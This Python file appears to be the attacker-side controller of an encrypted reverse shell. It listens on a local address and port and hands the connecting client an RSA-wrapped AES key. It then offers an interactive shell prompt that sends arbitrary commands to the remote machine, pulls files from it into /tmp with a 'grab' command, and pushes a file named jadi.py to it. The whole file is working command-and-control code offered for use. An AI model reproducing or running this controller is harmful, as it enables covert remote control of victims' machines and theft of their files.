import socket, string, random, os
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import Padding

IV = b"H" * 16


def transfer(conn, command):
    command = encrypt(command.encode())
    conn.send(command)
    grab , path = decrypt(command).decode().split('*')
    f = open('/tmp/'+path, 'wb')
    while 1:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if 'File not found'.encode() in bits:
            print('[-] unable to find out the file')
            break
        f.write(bits)

def send_file(conn,command):
    command = encrypt(command.encode())
    conn.send(command)
    if os.path.exists('jadi.py'):
        filename='jadi.py' 
        f = open(filename,'rb')
        packet = f.read(1024)
        while packet:
            conn.send(packet)
            packet = f.read(1024)
        conn.send('DONE'.encode())
        f.close()
    else:
        conn.send('Unable to find out the file'.encode())


key = ''.join(random.choice(string.ascii_lowercase
                           + string.ascii_uppercase + '!@#$%^&*()_+|`;.,/')                
                                      for _ in range(0,32))
def SEND_AES(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
    MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAk9Kof+hnLNlTQ1bCGQoZ
    H6vNd3g2blsNAPstYNihVLsj58C6GvWLmAfxBPSPcUfbeXPxCMWKCSHWqXWPhVdW
    onIfSL4xtSRs6/3oWag5s+dfQUUH+4FtTtC5GnWUxLV8HyRpPzJqbghip95ppsWM
    di/VTO0XrESUPr2tWGgqEHIbElvoNvEyuKKhMcO5UX9rk87iz0nKPYhb6law5iB2
    sJGhd8Bl0GGxV/qDWGBRUWCqnQ229bYAucNG6LFA8Yip3TNVq2ibqlO5NkX5+QmL
    bLeyxS7zbAWY/B0acjf9prj7szSQ3BatGQWwB12uYbMW8MByxPjIF5y5gV8+ccqx
    0l92u0lv63QUWZsYF1u1FOAb2daE1jJjg2isBJUajfpbPllfVkT/mL1mLxfOj5So
    +sBANAAnFmIfPkUiyp3TSvSTvdqNxx8KyjKwaduNMZaWgXsDRaCYduKfw+VWq5/6
    6DLYfO02HedAOr0OiIUL2x2RfJk511l0aCRrauOeiqOvhCHuyALLQgc5+/dSKF0u
    cKoze9jydujy1xHjR2tKiNSX8dYUqmZ22oz+5ZKCeIxPjKQ8tEwWiXevJWVyKTY7
    xt7cS5g90j1f114EOnKcJT81G1fwwXmvPIQ06Wc7oFJeQcmoWj/2j8ZL+cFOZUA9
    NFkxFZSUH/VP0MkPGcmjFWMCAwEAAQ==
    -----END PUBLIC KEY-----'''

    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect(HOST,PORT):
    store = ''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print('[+] Listening for incoming TCP connection')
    conn , addr = s.accept()
    conn.send(SEND_AES(key.encode()))
    with conn:
        print('[+][+] connection Established from', addr)
        while 1:
            store = ''
            command = input('SHELL@UnixSystem>>')
            if 'terminate' in command:
                conn.send('[-]terminate'.encode())
                conn.close()
                break
            elif 'grab' in command:
                transfer(conn,command)
            elif 'send_file' in command:
                send_file(conn,command)            
            else:
                command = encrypt(command.encode())
                conn.send(command)
                print(decrypt(conn.recv(4096)).decode())

if __name__ == '__main__':
    HOST = '192.168.1.4'
    PORT = 5555
    connect(HOST,PORT)           




